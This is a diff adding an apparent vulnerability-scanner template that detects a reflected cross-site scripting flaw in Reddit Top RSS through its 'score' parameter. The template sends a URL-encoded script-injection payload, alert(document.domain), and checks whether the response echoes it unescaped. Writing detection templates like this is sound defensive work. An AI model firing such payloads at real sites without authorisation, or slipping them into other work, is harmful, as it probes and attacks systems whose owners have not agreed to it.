@@ -1,0 +1,30 @@
+id: reddittop-rss-xss
+brief:
+    title: Reddit Top RSS - Cross-Site Scripting
+    by: arafatansari
+    level: high
+    about: Reddit Top RSS contains a cross-site scripting vulnerability via the /?subreddit=news&score= parameter.
+    label:
+        - reddit
+        - rss
+        - xss
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/?subreddit=news&score=2134%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+      signs:
+        - "on": word
+          has:
+            - value="2134"><script>alert(document.domain)</script>" min="0"
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
